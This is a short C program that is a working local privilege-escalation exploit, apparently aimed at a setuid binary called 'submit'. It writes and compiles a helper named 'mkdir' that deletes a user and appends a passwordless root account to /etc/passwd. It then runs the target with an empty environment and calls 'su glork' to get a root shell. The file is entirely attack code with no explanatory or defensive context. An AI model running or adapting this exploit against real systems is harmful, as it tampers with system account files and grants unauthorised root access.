#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>

#define TARGET "/usr/local/bin/submit"

int main(void) {
    char *args[] = { "", "none", NULL, NULL };
    char *env[] = { NULL };

    pid_t pid;
    int i;

    // Write C program to file
    FILE *fp = fopen("hax.c", "w+");
    fputs("#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n"
                    "int main(void) {"
                    "system(\"userdel glork\");"
                    "system(\"echo \\n >> /etc/passwd && echo 'glork::0:0:glork::/bin/sh' >> /etc/passwd\");"
                    "exit(0);"
                    "}"
            , fp);
    fclose(fp);

    // Compile
    system("gcc hax.c -o mkdir");


    pid = fork();

    if(pid < 0) {
        fprintf(stderr, "fork failed.\n");
    }
    else if(pid == 0) {  // Child
        if (execve(TARGET, args, env) < 0)
            fprintf(stderr, "execve failed.\n");
    }
    else { // Parent
        waitpid(pid, &i, 0);
        system("su glork");

        exit(0);
    }

    exit(0);
}
